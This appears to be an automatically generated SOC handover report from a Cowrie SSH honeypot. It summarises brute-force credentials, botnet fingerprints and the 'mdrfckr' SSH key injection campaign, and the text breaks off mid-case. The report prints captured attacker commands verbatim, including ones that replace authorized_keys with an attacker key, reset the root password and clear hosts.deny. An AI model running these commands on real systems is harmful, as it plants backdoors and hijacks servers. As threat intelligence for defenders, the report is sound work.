# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-04 |
| **Generated At** | 2026-06-04T20:10:43Z |
| **Shift Time** | 20:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **309** |
| Confirmed Threats | **293** |
| False Positives Filtered | **16** (5.2%) |
| Unique Attacker IPs | **37** |
| Countries of Origin | **14** |
| High Severity Cases | **65** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **244** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **177** |
| Unique Credential Pairs | **95** |
| Unique Usernames | **66** |
| Unique Passwords | **85** |
| Successful Auth Pairs | **42** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 66 |
| `345gs5662d34` | 29 |
| `admin` | 3 |
| `deployer` | 3 |
| `lemon` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 31 |
| `345gs5662d34` | 29 |
| `123456` | 5 |
| `1234` | 5 |
| `123` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 31 |
| `345gs5662d34` | `345gs5662d34` | 29 |
| `root` | `Win2008` | 3 |
| `lemon` | `lemon123` | 2 |
| `root` | `Test1234567890!` | 2 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `password111` | `139.198.113.29` | 2026-06-04T16:57:17 |
| `root` | `3245gs5662d34` | `139.198.113.29` | 2026-06-04T16:57:21 |
| `root` | `Test1234567890!` | `139.198.113.29` | 2026-06-04T17:01:33 |
| `root` | `abc.123456` | `103.67.80.61` | 2026-06-04T17:01:37 |
| `root` | `3245gs5662d34` | `103.67.80.61` | 2026-06-04T17:01:40 |
| `root` | `abc.123456` | `139.198.113.29` | 2026-06-04T17:03:39 |
| `root` | `HuaWei@123` | `139.198.113.29` | 2026-06-04T17:05:54 |
| `root` | `123456.Aa` | `139.198.113.29` | 2026-06-04T17:07:56 |
| `root` | `qwertyuiop123.` | `139.198.113.29` | 2026-06-04T17:20:22 |
| `root` | `WH123456@` | `139.198.113.29` | 2026-06-04T17:22:23 |
| `root` | `Test1234567890!` | `103.67.80.61` | 2026-06-04T17:22:36 |
| `root` | `HuaWei@123` | `103.67.80.61` | 2026-06-04T17:26:48 |
| `root` | `azer1234` | `156.239.224.79` | 2026-06-04T17:33:46 |
| `root` | `3245gs5662d34` | `156.239.224.79` | 2026-06-04T17:33:49 |
| `root` | `Admin$2024` | `156.239.224.79` | 2026-06-04T17:44:01 |
| `root` | `1234QWer` | `156.239.224.79` | 2026-06-04T17:46:06 |
| `root` | `Windows2025` | `156.239.224.79` | 2026-06-04T17:50:20 |
| `root` | `yz.123456` | `156.239.224.79` | 2026-06-04T17:56:31 |
| `root` | `qwerty121` | `156.239.224.79` | 2026-06-04T18:11:01 |
| `root` | `Win2008` | `43.156.60.15` | 2026-06-04T18:16:15 |
| `root` | `3245gs5662d34` | `43.156.60.15` | 2026-06-04T18:16:17 |
| `root` | `Qwerty#2024` | `14.29.240.154` | 2026-06-04T18:22:39 |
| `root` | `3245gs5662d34` | `14.29.240.154` | 2026-06-04T18:22:48 |
| `root` | `Lc123456.` | `14.29.240.154` | 2026-06-04T18:25:29 |
| `root` | `Abc!123456` | `58.229.253.119` | 2026-06-04T18:25:36 |
| `root` | `3245gs5662d34` | `58.229.253.119` | 2026-06-04T18:25:40 |
| `root` | `123q123q` | `14.29.240.154` | 2026-06-04T18:25:58 |
| `root` | `Asd123!!` | `14.29.240.154` | 2026-06-04T18:27:40 |
| `root` | `manoj` | `187.140.5.12` | 2026-06-04T18:30:45 |
| `root` | `3245gs5662d34` | `187.140.5.12` | 2026-06-04T18:30:52 |
| `root` | `@qwer2025` | `103.134.154.138` | 2026-06-04T18:32:53 |
| `root` | `3245gs5662d34` | `103.134.154.138` | 2026-06-04T18:32:55 |
| `root` | `qwe123,./` | `58.229.253.119` | 2026-06-04T18:33:40 |
| `root` | `hetzner` | `103.134.154.138` | 2026-06-04T18:35:47 |
| `root` | `@qwer2025` | `58.229.253.119` | 2026-06-04T18:37:36 |
| `root` | `hetzner` | `58.229.253.119` | 2026-06-04T18:39:33 |
| `root` | `Abc!123456` | `103.134.154.138` | 2026-06-04T18:41:30 |
| `root` | `Win2008` | `103.134.154.138` | 2026-06-04T18:47:12 |
| `root` | `Win2008` | `58.229.253.119` | 2026-06-04T18:53:40 |
| `root` | `ngf1r3wall` | `14.103.127.232` | 2026-06-04T18:58:23 |
| `root` | `qwe123,./` | `103.134.154.138` | 2026-06-04T18:58:37 |
| `root` | `admin` | `192.42.116.144` | 2026-06-04T19:34:32 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **309** |
| Sessions with Fingerprint | **7** |
| Unique HASSH Fingerprints | **7** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 226 |
| Go SSH scanner | 3 |
| OpenSSH | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 182 | 11 |
| `03a80b21afa8...` | Modern SSH client | 39 | 3 |
| `c39f4cec145e...` | Mirai/variant | 2 | 1 |
| `af8223ac9914...` | libssh-based | 2 | 1 |
| `864cef7e4d8a...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 182 | 11 | Mirai/variant |
| `03a80b21afa8...` | libssh | 39 | 3 | Modern SSH client |
| `95420f9d932d...` | libssh | 3 | 2 | — |
| `c39f4cec145e...` | Go SSH scanner | 2 | 1 | Mirai/variant |
| `af8223ac9914...` | libssh | 2 | 1 | libssh-based |
| `864cef7e4d8a...` | Go SSH scanner | 1 | 1 | Mirai/variant |
| `1cc79c7da9b5...` | OpenSSH | 1 | 1 | libssh-based |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 32 | 9 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:X0LizIErIgAW"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `14.29.240.154`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `14.103.127.232`, `156.239.224.79`, `58.229.253.119`, `14.29.240.154`, `187.140.5.12`, `43.156.60.15`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **37** |
| Unique ASNs | **28** |
| High-Risk ASNs | **23** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4811` | China Telecom (Group) | 4 | HIGH |
| `AS398324` | Censys, Inc. | 3 | HIGH |
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 2 | LOW |
| `AS9808` | China Mobile Communications Group Co., Ltd. | 2 | HIGH |
| `AS17638` | ASN for TIANJIN Provincial Net of CT | 1 | HIGH |
| `AS9318` | SK Broadband Co Ltd | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (65)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-00324d14d87c

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 16:57 |
| **Last Seen** | 2026-06-04 16:57 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:57:16` | `cowrie.session.connect` |
| `2026-06-04 16:57:16` | `cowrie.client.version` |
| `2026-06-04 16:57:16` | `cowrie.client.kex` |
| `2026-06-04 16:57:17` | `cowrie.login.success` |
| `2026-06-04 16:57:17` | `cowrie.session.params` |
| `2026-06-04 16:57:17` | `cowrie.command.input` |
| `2026-06-04 16:57:17` | `cowrie.command.failed` |
| `2026-06-04 16:57:18` | `cowrie.log.closed` |
| `2026-06-04 16:57:18` | `cowrie.session.params` |
| `2026-06-04 16:57:18` | `cowrie.command.input` |
| `2026-06-04 16:57:18` | `cowrie.session.file_download` |
| `2026-06-04 16:57:18` | `cowrie.log.closed` |
| `2026-06-04 16:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-903ae8e8c833

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 16:57 |
| **Last Seen** | 2026-06-04 16:57 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 16:57:20` | `cowrie.session.connect` |
| `2026-06-04 16:57:20` | `cowrie.client.version` |
| `2026-06-04 16:57:20` | `cowrie.client.kex` |
| `2026-06-04 16:57:21` | `cowrie.login.success` |
| `2026-06-04 16:57:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2092888865a0

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:01 |
| **Last Seen** | 2026-06-04 17:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:01:33` | `cowrie.session.connect` |
| `2026-06-04 17:01:33` | `cowrie.client.version` |
| `2026-06-04 17:01:33` | `cowrie.client.kex` |
| `2026-06-04 17:01:33` | `cowrie.login.success` |
| `2026-06-04 17:01:34` | `cowrie.session.params` |
| `2026-06-04 17:01:34` | `cowrie.command.input` |
| `2026-06-04 17:01:34` | `cowrie.command.failed` |
| `2026-06-04 17:01:34` | `cowrie.log.closed` |
| `2026-06-04 17:01:34` | `cowrie.session.params` |
| `2026-06-04 17:01:34` | `cowrie.command.input` |
| `2026-06-04 17:01:34` | `cowrie.session.file_download` |
| `2026-06-04 17:01:34` | `cowrie.log.closed` |
| `2026-06-04 17:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6d94392bb18c

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:01 |
| **Last Seen** | 2026-06-04 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:01:36` | `cowrie.session.connect` |
| `2026-06-04 17:01:36` | `cowrie.client.version` |
| `2026-06-04 17:01:36` | `cowrie.client.kex` |
| `2026-06-04 17:01:37` | `cowrie.login.success` |
| `2026-06-04 17:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c555f22ef685

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 17:01 |
| **Last Seen** | 2026-06-04 17:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:01:37` | `cowrie.session.connect` |
| `2026-06-04 17:01:37` | `cowrie.client.version` |
| `2026-06-04 17:01:37` | `cowrie.client.kex` |
| `2026-06-04 17:01:37` | `cowrie.login.success` |
| `2026-06-04 17:01:37` | `cowrie.session.params` |
| `2026-06-04 17:01:37` | `cowrie.command.input` |
| `2026-06-04 17:01:37` | `cowrie.command.failed` |
| `2026-06-04 17:01:37` | `cowrie.log.closed` |
| `2026-06-04 17:01:38` | `cowrie.session.params` |
| `2026-06-04 17:01:38` | `cowrie.command.input` |
| `2026-06-04 17:01:38` | `cowrie.session.file_download` |
| `2026-06-04 17:01:38` | `cowrie.log.closed` |
| `2026-06-04 17:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-06aee575fd7b

| Field | Detail |
|---|---|
| **Source IP** | `103.67.80[.]61` |
| **First Seen** | 2026-06-04 17:01 |
| **Last Seen** | 2026-06-04 17:01 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:01:39` | `cowrie.session.connect` |
| `2026-06-04 17:01:39` | `cowrie.client.version` |
| `2026-06-04 17:01:39` | `cowrie.client.kex` |
| `2026-06-04 17:01:40` | `cowrie.login.success` |
| `2026-06-04 17:01:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.67.80[.]61` to AbuseIPDB if not already reported
- [ ] Block `103.67.80[.]61` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8c5045641530

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:03 |
| **Last Seen** | 2026-06-04 17:03 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:03:38` | `cowrie.session.connect` |
| `2026-06-04 17:03:38` | `cowrie.client.version` |
| `2026-06-04 17:03:38` | `cowrie.client.kex` |
| `2026-06-04 17:03:39` | `cowrie.login.success` |
| `2026-06-04 17:03:39` | `cowrie.session.params` |
| `2026-06-04 17:03:39` | `cowrie.command.input` |
| `2026-06-04 17:03:39` | `cowrie.command.failed` |
| `2026-06-04 17:03:39` | `cowrie.log.closed` |
| `2026-06-04 17:03:40` | `cowrie.session.params` |
| `2026-06-04 17:03:40` | `cowrie.command.input` |
| `2026-06-04 17:03:40` | `cowrie.session.file_download` |
| `2026-06-04 17:03:40` | `cowrie.log.closed` |
| `2026-06-04 17:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ba43f3e81f46

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:03 |
| **Last Seen** | 2026-06-04 17:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:03:42` | `cowrie.session.connect` |
| `2026-06-04 17:03:42` | `cowrie.client.version` |
| `2026-06-04 17:03:42` | `cowrie.client.kex` |
| `2026-06-04 17:03:43` | `cowrie.login.success` |
| `2026-06-04 17:03:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-529dc562b59d

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:05 |
| **Last Seen** | 2026-06-04 17:05 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:05:53` | `cowrie.session.connect` |
| `2026-06-04 17:05:53` | `cowrie.client.version` |
| `2026-06-04 17:05:53` | `cowrie.client.kex` |
| `2026-06-04 17:05:54` | `cowrie.login.success` |
| `2026-06-04 17:05:54` | `cowrie.session.params` |
| `2026-06-04 17:05:54` | `cowrie.command.input` |
| `2026-06-04 17:05:54` | `cowrie.command.failed` |
| `2026-06-04 17:05:54` | `cowrie.log.closed` |
| `2026-06-04 17:05:55` | `cowrie.session.params` |
| `2026-06-04 17:05:55` | `cowrie.command.input` |
| `2026-06-04 17:05:55` | `cowrie.session.file_download` |
| `2026-06-04 17:05:55` | `cowrie.log.closed` |
| `2026-06-04 17:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a75ac23d26e5

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:05 |
| **Last Seen** | 2026-06-04 17:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:05:57` | `cowrie.session.connect` |
| `2026-06-04 17:05:57` | `cowrie.client.version` |
| `2026-06-04 17:05:57` | `cowrie.client.kex` |
| `2026-06-04 17:05:58` | `cowrie.login.success` |
| `2026-06-04 17:05:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.198.113[.]29` to AbuseIPDB if not already reported
- [ ] Block `139.198.113[.]29` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-61c327b94faa

| Field | Detail |
|---|---|
| **Source IP** | `139.198.113[.]29` |
| **First Seen** | 2026-06-04 17:07 |
| **Last Seen** | 2026-06-04 17:08 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 17:07:56` | `cowrie.session.connect` |
| `2026-06-04 17:07:56` | `cowrie.client.version` |
| `2026-06-04 17:07:56` | `cowrie.client.kex` |
| `2026-06-04 17:07:56` | `cowrie.login.success` |
| `2026-06-04 17:07:57` | `cowrie.session.params` |
| `2026-06-04 17:07:57` | `cowrie.command.input` |
